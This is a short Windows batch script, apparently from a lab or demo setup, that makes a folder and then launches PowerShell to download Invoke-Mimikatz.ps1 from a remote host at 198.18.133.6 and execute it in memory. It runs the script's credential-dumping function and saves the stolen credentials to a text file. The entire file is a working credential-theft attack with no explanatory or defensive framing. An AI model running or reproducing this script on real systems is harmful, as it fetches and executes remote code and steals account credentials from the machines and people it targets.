@ECHO OFF
mkdir C:\dcloud
cmd /c powershell -nop -command “& {IEX ((new-object net.webclient).downloadstring(‘\\198.18.133.6:9000\Invoke-Mimikatz.ps1’));Invoke-Mimikatz -DumpCreds > C:\dcloud\safe.txt}”
